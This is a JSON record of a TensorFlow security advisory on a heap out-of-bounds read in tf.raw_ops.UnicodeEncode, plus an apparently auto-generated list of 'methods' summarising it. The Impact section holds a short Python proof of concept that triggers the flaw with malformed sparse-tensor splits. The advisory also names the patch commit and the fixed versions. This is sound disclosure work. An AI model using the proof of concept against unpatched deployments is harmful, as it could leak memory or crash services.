{"description": "### Impact\nAn attacker can access data outside of bounds of heap allocated array in `tf.raw_ops.UnicodeEncode`:\n\n```python\nimport tensorflow as tf\n\ninput_values = tf.constant([58], shape=[1], dtype=tf.int32)\ninput_splits = tf.constant([[81, 101, 0]], shape=[3], dtype=tf.int32)\noutput_encoding = \"UTF-8\"\n\ntf.raw_ops.UnicodeEncode(\n    input_values=input_values, input_splits=input_splits,\n    output_encoding=output_encoding)\n```\n\nThis is because the [implementation](https://github.com/tensorflow/tensorflow/blob/472c1f12ad9063405737679d4f6bd43094e1d36d/tensorflow/core/kernels/unicode_ops.cc)\nassumes that the `input_value`/`input_splits` pair specify a valid sparse tensor.\n\n### Patches\nWe have patched the issue in GitHub commit [51300ba1cc2f487aefec6e6631fef03b0e08b298](https://github.com/tensorflow/tensorflow/commit/51300ba1cc2f487aefec6e6631fef03b0e08b298).\n\nThe fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by Ying Wang and Yakun Zhang of Baidu X-Team.", "methods": ["Heap OOB access in unicode ops.", "Used GitHub for patching the issue.", "Used commit hash (51300ba1cc2f487aefec6e6631fef03b0e08b298) for tracking the patch.", "Used GitHub for tracking the fix in TensorFlow 2.5.0.", "Used GitHub for cherrypicking the fix in other versions (2.4.2, 2.3.3, 2.2.3, 2.1.4)."]}
